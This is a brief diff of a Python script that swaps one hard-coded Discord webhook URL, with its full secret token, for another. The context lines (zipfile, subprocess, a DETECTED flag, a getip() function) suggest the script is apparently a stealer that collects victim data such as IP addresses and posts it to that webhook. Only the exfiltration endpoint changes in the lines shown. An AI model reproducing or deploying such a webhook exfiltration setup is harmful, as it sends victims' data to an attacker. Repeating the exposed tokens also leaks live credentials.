@@ -16,7 +16,7 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-hook="https://discord.com/api/webhooks/1371130534645731468/oKy6fa7TtfEORvhzut8Fapo2RA5_jkRxDfPuVGBrYkxIrmjMpwi3eqUd-jwcEq121IqT"
+hook="https://discord.com/api/webhooks/1371133549264240832/UD-z27Kok_gpERR3Fo_Chezj3_0DdCaqbmzTmwt0rX-gAxIPXY65l0Rtz0xlzuajniQt"
 DETECTED=False
 def getip():
     ip='None'
